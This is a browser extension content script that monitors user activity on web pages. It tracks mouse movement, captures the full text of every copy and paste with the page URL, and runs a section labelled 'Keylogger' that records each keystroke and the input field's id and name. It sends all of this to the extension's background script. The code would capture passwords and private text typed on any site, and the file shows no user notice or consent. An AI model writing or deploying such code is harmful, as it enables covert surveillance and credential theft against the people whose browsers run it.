// Activity monitoring state
let activityState = {
    clipboardHistory: [],
    mouseMovements: [],
    tabSwitches: [],
    lastActivity: Date.now(),
    totalMouseDistance: 0
};

// Mouse movement tracking with centimeter conversion
let lastMouseX = null;
let lastMouseY = null;

// Conversion factor (96 DPI is standard, 1 inch = 2.54 cm)
// 1 pixel = (1/96) inches = (1/96) * 2.54 cm
const PIXELS_TO_CM = (1/96) * 2.54;

document.addEventListener('mousemove', (event) => {
    try {
        if (lastMouseX !== null && lastMouseY !== null) {
            const distanceX = event.clientX - lastMouseX;
            const distanceY = event.clientY - lastMouseY;
            const distancePixels = Math.sqrt(distanceX ** 2 + distanceY ** 2);
            
            // Convert to centimeters with more precision
            const distanceCm = distancePixels * PIXELS_TO_CM;

            // Only add significant movements (ignore tiny movements)
            if (distanceCm > 0.01) { // Ignore movements less than 0.01 cm
                activityState.totalMouseDistance += distanceCm;

                // Send update to background script
                chrome.runtime.sendMessage({
                    type: 'UPDATE_MOUSE_MOVEMENT',
                    data: {
                        totalDistance: activityState.totalMouseDistance,
                        timestamp: Date.now(),
                        unit: 'cm'
                    }
                });
            }
        }
        lastMouseX = event.clientX;
        lastMouseY = event.clientY;
    } catch (error) {
        console.error("Error in mousemove event:", error);
    }
});

// Clipboard monitoring (Copy)
document.addEventListener('copy', (event) => {
    try {
        let copiedText = window.getSelection().toString();
        if (!copiedText.trim() && document.activeElement && document.activeElement.value) {
            copiedText = document.activeElement.value.substring(document.activeElement.selectionStart, document.activeElement.selectionEnd);
        }
        if (copiedText.trim()) {
            const clipboardEntry = {
                type: 'copy',
                timestamp: Date.now(),
                text: copiedText,
                url: window.location.href,
                title: document.title
            };
            
            // Add to local state
            activityState.clipboardHistory.push(clipboardEntry);
            
            // Send to background script
            chrome.runtime.sendMessage({ 
                type: "clipboard", 
                data: clipboardEntry 
            });
        }
    } catch (error) {
        console.error("Error in copy event:", error);
    }
});

// Clipboard monitoring (Paste)
document.addEventListener('paste', (event) => {
    try {
        const pastedText = (event.clipboardData || window.clipboardData).getData('text');
        if (pastedText.trim()) {
            const pasteEntry = {
                type: 'paste',
                timestamp: Date.now(),
                text: pastedText,
                url: window.location.href,
                title: document.title
            };
            
            // Add to local state
            activityState.clipboardHistory.push(pasteEntry);
            
            // Send to background script
            chrome.runtime.sendMessage({ 
                type: "clipboard", 
                data: pasteEntry 
            });
        }
    } catch (error) {
        console.error("Error in paste event:", error);
    }
});

// Keylogger - Improved to prevent data loss
document.addEventListener('keydown', function(event) {
    try {
        const keystroke = {
            key: event.key,
            code: event.code,
            timestamp: Date.now(),
            url: window.location.href,
            title: document.title
        };

        // Add contextual information
        if (document.activeElement) {
            if (document.activeElement.tagName === 'INPUT' || document.activeElement.tagName === 'TEXTAREA') {
                keystroke.element = document.activeElement.tagName;
                keystroke.id = document.activeElement.id || null;
                keystroke.name = document.activeElement.name || null;
            }
        }

        // Send to background script
        chrome.runtime.sendMessage({
            type: 'KEYSTROKE',
            data: keystroke
        });
    } catch (error) {
        console.error("Error in keydown event:", error);
    }
});

